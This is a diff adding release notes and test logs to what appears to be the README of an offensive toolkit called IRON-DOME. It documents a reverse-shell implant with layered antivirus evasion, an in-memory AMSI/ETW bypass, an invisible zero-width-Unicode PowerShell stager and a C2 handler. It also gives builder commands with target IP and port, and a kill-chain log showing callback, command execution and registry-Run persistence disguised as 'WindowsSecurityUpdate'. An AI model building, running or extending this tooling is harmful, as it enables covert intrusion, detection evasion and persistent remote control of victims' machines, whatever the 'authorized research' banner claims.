@@ -237,6 +237,78 @@ gcc ghost_iron_out.c -o ghost_iron.exe -lws2_32 -lcrypt32 -D_WIN32_WINNT=0x0600 
 
 ```
 ╔══════════════════════════════════════════════════════════════════════╗
+║           I R O N - D O M E  ·  F I N A L  R E L E A S E            ║
+║                     v 2 . 0 . 0   —   2 0 2 6 - 0 6 - 2 6           ║
+╚══════════════════════════════════════════════════════════════════════╝
+```
+
+```
+  ╔══════════════════════════════════════════════════════════════╗
+  ║           I R O N - D O M E  ·  22DIV  ·  VADER            ║
+  ║      iron-sun  ·  CHEYANNE  ·  GHOST ENCODER  ·  ADF       ║
+  ╚══════════════════════════════════════════════════════════════╝
+
+       ADF RISING SUN                  IDF IRON DOME
+       ─────────────                   ─────────────
+            ╿                           ✦   ✦   ✦
+       \  \ ╿ / /                     ✦    ✡    ✦
+        \  \╿/ /       ≋≋≋≋≋         ✦  22DIV  ✦
+    ─────\──☀──/─────  ≋≋≋≋≋         ✦    ✡    ✦
+        /  /╿\ \       ≋≋≋≋≋           ✦   ✦   ✦
+       /  / ╿ \ \       INTERCEPTED     DOME ACTIVE
+            ╿
+
+  ✦ LAT -33.8688  LONG 151.2093  ✦  OPERATOR: VADER  ✦  ORACLE
+  ✦ OWN HARDWARE ONLY  ✦  AUTHORIZED RESEARCH  ✦  OPSEC ACTIVE
+```
+
+### IRON-DOME: Unified Platform
+
+IRON-DOME assembles all research streams into a single deployable package:
+
+| Component | Role | Evasion |
+|-----------|------|---------|
+| **iron-sun** | TCP reverse shell | 7-layer PE (XOR + dynAPI + sandbox + stomp + ISUN + jitter + MinGW) |
+| **VADER** | AMSI/ETW bypass | Memory patch: `AmsiScanBuffer` + `EtwEventWrite` → `xor eax,eax; ret` |
+| **Ghost Encoder** | PS1 delivery | Zero-width Unicode steganography — invisible to content scanners |
+| **CHEYANNE** | C2 | Menu-driven ops, ISUN auth gate, multi-shell handler |
+
+**Builder — one command assembles the full package:**
+
+```bash
+# 7-layer standard
+python iron_dome_builder.py --target 192.168.1.145 --port 4443 --xor 0xFC
+
+# 8-layer with VADER AMSI/ETW bypass
+python iron_dome_builder.py --target 192.168.1.145 --port 4443 --xor 0xFC --vader
+```
+
+**Final release results (2026-06-26):**
+
+```
+[1/4] C source generated — XOR 0xFC on 9 IP bytes + ISUN magic
+      VADER AMSI/ETW bypass code injected
+[2/4] COMPILED — 140,800 bytes (8-layer evasion stack)
+      SHA256: cfde39fa5f901c09234b06fefc007f23ab84449d424e2b5fe852ec9bcdc73400
+      [1] XOR string obfuscation
+      [2] Dynamic API resolution
+      [3] Anti-sandbox (timing + screen + disk)
+      [4] PE header stomp
+      [5] ISUN magic auth gate
+      [6] Execution jitter
+      [7] MinGW/gcc PE (no MSVC fingerprint)
+      [8] VADER AMSI/ETW bypass (memory patch + flush)  ← VADER
+[3/4] Ghost PS1 stager — zero-width Unicode (11,472 bytes)
+[4/4] Deployment doc written
+BUILD COMPLETE
+```
+
+**Full documentation:** [rainfantry.github.io/irondome.html](https://rainfantry.github.io/irondome.html)
+
+---
+
+```
+╔══════════════════════════════════════════════════════════════════════╗
 ║                  K I L L · C H A I N · L O G S                       ║
 ║                      s e s s i o n   2 0 2 6 - 0 6 - 2 6             ║
 ╚══════════════════════════════════════════════════════════════════════╝
@@ -262,6 +334,26 @@ gcc ghost_iron_out.c -o ghost_iron.exe -lws2_32 -lcrypt32 -D_WIN32_WINNT=0x0600 
 | listener.py TCP bind :4443 | PASS |
 | test_listener.py connect + whoami/hostname | PASS |
 | 30s session held, zero KAV interference | PASS |
+
+### Session 2026-06-26 — Final Release — IRON-DOME v2.0.0 — 8/8 PASS
+
+```
+iron_dome_builder.py --target 127.0.0.1 --port 4443 --xor 0xFC --variant 1 --vader
+  BUILD: 140,800 bytes | SHA256: cfde39fa... | 8-layer evasion stack
+  VADER: AmsiScanBuffer + EtwEventWrite patched
+
+test_local_chain.py
+  [PASS] ghost_fud.exe built         117,248 bytes
+  [PASS] ghost_loader.exe built      117,248 bytes
+  [PASS] TCP armed                   :4443 listener
+  [PASS] Payload launched            PS PID=3176
+  [PASS] TCP callback                127.0.0.1:60985 banner=OK>
+  [PASS] whoami                      gwu07
+  [PASS] hostname                    LAPTOP-R32M8MLI
+  [PASS] Persist set + verified      HKCU\Run\WindowsSecurityUpdate
+
+VERDICT: PASS (8/8) — IRON-DOME KILL CHAIN GREEN
+```
 
 ### Session 2026-06-25 — Full Local Kill Chain — 8/8 PASS
 
